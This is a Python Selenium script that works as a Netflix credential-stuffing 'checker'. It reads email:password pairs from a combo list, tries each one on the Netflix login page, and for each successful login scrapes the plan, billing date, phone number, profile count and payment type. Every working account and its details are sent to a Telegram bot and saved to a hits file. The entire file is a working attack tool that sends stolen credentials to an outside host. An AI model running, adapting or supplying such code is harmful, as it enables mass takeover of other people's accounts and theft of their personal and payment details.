from selenium.webdriver.common.keys import Keys
from Nouredinekn import driver, sndToTelegram, colors, banner, clear, getTgInfo, other ,saveHits 
import time
from selenium.webdriver.common.by import By
import codecs
import webbrowser
webbrowser.open_new_tab('t.me/nkcp_tm')

# post  Account
def sndAcc(userpar, passpar):
    drv.get('https://www.netflix.com/login')
    email = drv.find_element_by_name('userLoginId')
    passw = drv.find_element_by_name('password')
    email.send_keys(userpar)
    passw.send_keys(passpar)
    passw.send_keys(Keys.RETURN)
# Check login


def check():
    try:
        err = drv.find_element_by_class_name('ui-message-contents')
        if 'Please try again in a few minutes.' in err.text:
            return 'Retry'
        else:
            return False
    except:
        try:
            err = drv.find_element_by_class_name('inputError')
            return False
        except:
            try:
                drv.find_element_by_class_name('our-story-welcome-back')
            except:
                return True

# parse capture


def Capture():
    if check() == True:
        drv.get('https://www.netflix.com/YourAccount')
        try:
            datePayment = drv.find_element(
                by=By.TAG_NAME, value='div[data-uia="nextBillingDate-item"]').text
        except:
            datePayment = "NOT FOUND"
        try:
            plan = drv.find_element(
                by=By.TAG_NAME, value='div[data-uia="plan-label"]').text
        except:
            plan = "NOT FOUND"
        try:
            phone = drv.find_element(
                by=By.TAG_NAME, value='div[data-uia="account-phone"]').text
        except:
            phone = "NOT FOUND"
        try:
            member = drv.find_element(
                by=By.TAG_NAME, value='div[data-uia="member-since"]').text
        except:
            member = "NOT FOUND"
        try:
            prof = drv.find_elements(
                by=By.CLASS_NAME, value='single-profile')
        except:
            prof = "NOT FOUND"
        try:
            pm = drv.find_element(
                by=By.CLASS_NAME, value='mopType').text
            if '@' in pm:
                pm = 'Paypal'
            else:
                pm = 'credit card'

        except:
            pm = "NOT FOUND"
        msg = f'''|-DATE: {datePayment}
|-PLAN: {plan}
|-{phone}
|-Member: {member}
|-numProfiles: {len(prof)}
|- payment: {pm}
|-BY: {other()}
            '''
        return msg
    elif check() == 'Retry':
        sndToTelegram(id=getTgInfo.id, token=getTgInfo.token,
                      mesg='CHECKER STOPED PLEASE RUN IT AGAIN! ')
        return False
    

# start checker
combo = codecs.open('combo.txt', 'r',encoding='utf-8').read().splitlines()
hitscon, inv, chk = 0, 0, 0
print(banner(hits=hitscon, inv=inv, chk=chk))
for i in combo:
    drv = driver('driver\chromedriver.exe')
    user = i.split(':')[0]
    passw = i.split(':')[1]
    sndAcc(userpar=user, passpar=passw)
    time.sleep(1)
    check()
    Capture()
    if Capture():
        hits = '\t ------NETFLIX ACCOUNT HITS-------- \n|-ACCOUNT: ' + \
            i+'\n' + str(Capture())+'\n'
        sndToTelegram(token=getTgInfo.token, id=getTgInfo.id, mesg=hits)
        saveHits(hits)
        print(colors.G, f'hits===> {i}')
        hitscon += 1
    else:
        print(colors.R, f'BAD ===> {i}')
        inv += 1
    chk += 1
    if inv % 2 == 0 or chk == 1:
        clear()
        print(banner(hits=hitscon, inv=inv, chk=chk))
    drv.quit()
